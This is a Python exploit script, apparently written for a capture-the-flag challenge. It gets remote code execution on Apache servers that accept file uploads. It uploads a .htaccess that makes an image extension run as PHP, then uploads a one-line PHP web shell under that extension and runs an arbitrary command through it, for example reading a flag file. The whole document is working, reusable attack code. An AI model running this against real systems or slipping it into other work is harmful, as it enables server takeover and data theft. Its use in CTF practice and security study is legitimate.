#!/usr/bin/env python3
"""Reusable Apache .htaccess upload-to-RCE exploit.

Uploads a .htaccess that makes an allowed image extension run as PHP, then
uploads a PHP web shell using that extension. No magic bytes/Content-Type
bypass required because the Apache handler (not a mime check) runs PHP.

Usage:
    python3 htaccess_shell.py <base_url> <upload_endpoint> [shell_ext] [cmd]

Example:
    python3 htaccess_shell.py http://target:54321/ upload.php png "cat ../../flag.txt"
"""
import sys
import requests

SHELL_PHP = b"<?php system($_GET['c']); ?>"
HTACCESS = b"AddType application/x-httpd-php .png\n"


def probe(base, endpoint, filename, data=b"x", field="image"):
    """Return True if an upload of `filename` is accepted by the filter."""
    try:
        r = requests.post(
            base + endpoint,
            files={field: (filename, data, "application/octet-stream")},
            timeout=10,
        )
        return b"Successfully" in r.content
    except requests.RequestException:
        return False


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        return 1
    base = sys.argv[1].rstrip("/")
    endpoint = sys.argv[2]
    ext = sys.argv[3] if len(sys.argv) > 3 else "png"
    cmd = sys.argv[4] if len(sys.argv) > 4 else "id"

    ht = HTACCESS.replace(b".png", ("." + ext).encode()) if ext != "png" else HTACCESS

    ok_ht = probe(base, endpoint, ".htaccess", ht)
    if not ok_ht:
        print("[-] .htaccess upload rejected - filter may block dotfiles. Aborting.")
        return 1
    print("[+] .htaccess uploaded (forcing PHP on .%s)" % ext)

    shell_name = "shell.%s" % ext
    if not probe(base, endpoint, shell_name, SHELL_PHP):
        print("[-] shell upload rejected. Recheck allowed extensions.")
        return 1
    print("[+] shell uploaded as images/%s" % shell_name)

    shell_url = "%s/images/%s?c=%s" % (base, shell_name, cmd)
    print("[*] Executing: %s" % shell_url)
    try:
        r = requests.get(shell_url, timeout=10)
        print(r.text)
    except requests.RequestException as e:
        print("[-] Error fetching shell: %s" % e)
    return 0


if __name__ == "__main__":
    sys.exit(main())
